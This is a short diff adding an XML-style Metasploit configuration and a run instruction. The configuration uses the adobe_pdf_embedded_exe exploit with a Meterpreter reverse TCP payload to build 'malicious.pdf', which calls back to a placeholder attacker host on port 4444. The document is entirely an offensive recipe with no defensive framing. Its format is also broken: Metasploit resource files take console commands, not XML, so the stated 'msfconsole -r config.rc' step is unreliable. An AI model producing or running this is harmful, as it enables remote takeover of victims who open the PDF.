@@ -1,0 +1,14 @@
+<Metasploit>
+  <Exploit>
+    <Module>exploit/windows/fileformat/adobe_pdf_embedded_exe</Module>
+    <Payload>windows/meterpreter/reverse_tcp</Payload>
+    <Options>
+      <LHOST>x.x.x.x</LHOST>
+      <LPORT>4444</LPORT>
+      <FILENAME>malicious.pdf</FILENAME>
+    </Options>
+  </Exploit>
+</Metasploit>
+
+
+Save as config.rc and run with msfconsole -r config.rc.
